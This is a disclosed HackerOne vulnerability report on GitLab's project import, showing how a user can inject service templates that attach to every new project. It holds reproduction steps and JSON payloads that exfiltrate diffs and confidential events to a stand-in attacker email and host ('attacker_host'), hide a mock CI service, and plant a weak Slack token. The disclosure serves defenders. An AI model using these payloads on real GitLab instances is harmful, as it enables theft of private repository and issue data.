# Exfiltrate and mutate repository and project data through injected templated service

## Report Details
- **Report ID**: 446585
- **URL**: https://hackerone.com/reports/446585
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-11-18T03:13:40.062Z
- **Disclosed**: 2019-03-05T00:09:55.389Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
The GitLab import feature contains a vulnerability that allows an attacker to import a project that creates a service template. Service templates can normally only be created by a GitLab instance Administrator. When a new project is created, service templates are automatically initialized for the project that is being created. Initializing and saving the service templates is handled in the `Projects::CreateService` class:

**app/services/projects/create_service.rb**
```ruby
# ...
def create_services_from_active_templates(project)
  Service.where(template: true, active: true).each do |template|
    service = Service.build_from_template(project.id, template)
    service.save!
  end
end
# ...
```

This means that when an attacker has created a templated service that is valid, any project created after that, will automatically install the attacker's service for that project. There are multiple attacks possible with this, which will be described in the Impact section of this report. Depending on the strategy the attacker takes, it may impact Confidentiality, Integrity, as well as Availability.

# Proof of concept
Attached you can find a tar file that injects a `MockCiService` as template to the GitLab instance: F377180. In order to manually reproduce this, follow the steps below.

1. Sign in as any user
1. Create a new project
1. Enable the CI service through Settings > Integrations
1. Export the project and download the export file
1. Extract the files, it'll contain a `project.json` file
1. Replace `"template":false` in the `services` array with `"template":true`
1. Replace `CiService` in the `services` array with `MockCiService`
1. Create a new tar file (`tar -zcvf service_template.tar.gz project.json VERSION project.bundle`)
1. Upload the tar file
1. Sign in as another user
1. Create another project
1. Immediately export the project and download the export file
1. Extract the files
1. Observe that the `project.json` file will contain the service created for the other project

# Additional, seemingly, less severe issues
When looking into this feature, it was also observed that an attacker can create custom attributes for a project. I noticed that custom project attributes can only be created by an instance Administrator. However, by specifying custom attributes in the `custom_attributes` array, a user can create custom project attributes for the project that is being created. Depending on how the custom attributes are used on the instance, this may have additional consequences.

## Impact

An attacker can decide on what strategy to take with this vulnerability. The most interesting ones that I could find are described below.

**Exfiltrating repository event**
The `EmailsOnPushService` has the option to include a commit diff in an email. When the JSON below is added to the `project.json` file, any commit's diff will be emailed to the attacker.

```json
{
  "id": 41858507,
  "title": "Email",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "send_from_committer_email": false,
    "disable_diffs": false,
    "recipients": "attacker@domain.tld"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "ci",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "EmailsOnPushService"
}
```

**Exfiltrating (confidential) issues, merge requests, pipelines, etc.**
The HipChat service, similar to Slack, is a service that responds to all events a project can trigger. Creating a template for this service will automatically send all new issues, notes, merge requests, pipeline updates, and pushes to a HipChat server. Below is the JSON object to inject a HipChat service template.

```json
{
  "id": 41858507,
  "title": "HipChat",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "token": "some_token",
    "room": "room",
    "server": "",
    "color": "red",
    "api_version": ""
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "common",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "HipchatService"
}
```

**Hidden services**
An attacker can leverage the `MockCiService` to inject a service that is not visible in the UI. The only mock service that interacts with an actual service is the `MockCiService`. The other two, `MockDeploymentService` and `MockMonitoringService`, do not interact with an external URL.

```json
{
  "id": 41858507,
  "title": "MockCI",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "mock_service_url": "https://attacker_host/",
    "multiproject_enabled": "1",
    "pass_unstable": "0"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "ci",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "MockCiService"
}
```

Unconfirmed: **Mutating data**
The Slack service / integration allows a user to also interact with objects in a project. Because an attacker can force a weak token in the service template, it can then send an API request to the GitLab API to interact with the project. This could not be confirmed because I did not feel comfortable creating a Slack template on gitlab.com and I was not able to set up the Slack integration on my own GitLab instance. However, I was able to confirm that I was able to create this service on my own GitLab instance with a weak token (`a`). JSON below.

```json
{
  "id": 41858507,
  "title": "Slack",
  "project_id": 9465078,
  "created_at": "2018-11-18T01:22:06.990Z",
  "updated_at": "2018-11-18T01:22:06.990Z",
  "active": true,
  "properties": {
    "token": "a"
  },
  "template": true,
  "push_events": true,
  "issues_events": true,
  "merge_requests_events": true,
  "tag_push_events": true,
  "note_events": true,
  "category": "common",
  "default": false,
  "wiki_page_events": true,
  "pipeline_events": true,
  "confidential_issues_events": true,
  "commit_events": true,
  "job_events": true,
  "confidential_note_events": true,
  "type": "SlackSlashCommandsService"
}
```

**External services**
The two other services that had an interesting side effect were the `ExternalWikiService` and `CustomIssueTrackerService`. Both of them can be used to overwrite a project's Issue and Wiki URL in their project. This may be used to social engineer users into creating issues on a domain that is controlled by the attacker.

## Attachments
- service_template.tar.gz
